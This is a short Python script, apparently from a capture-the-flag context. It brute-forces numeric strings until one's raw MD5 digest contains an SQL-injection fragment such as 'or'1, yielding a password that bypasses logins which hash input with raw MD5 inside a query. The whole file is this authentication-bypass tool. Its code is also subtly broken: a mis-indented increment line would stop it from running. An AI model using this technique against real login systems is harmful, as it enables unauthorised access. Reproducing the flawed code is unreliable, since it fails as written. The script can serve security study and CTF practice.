#! /usr/bin/env python3

import re
import string
import random
import hashlib

def main():
    i = 0
    regex = ".*'((or)|([|][|]))'[1-9]" or ".*'((or)|([|][|]))'[1-9]"
    while 1:
        str_ = ''.join(random.choice(string.digits) for _ in range(35))                 
        if i % 1e5==0:
            print('[STR INFO]: %s'%str_)
        m = hashlib.md5()
        m.update(str_.encode('UTF-8'))
        if re.search(regex, str(m.digest()), re.I):
            print('[PASSWORD]: %s'%str_)
            break
       i+=1

if __name__ == '__main__':
    main()
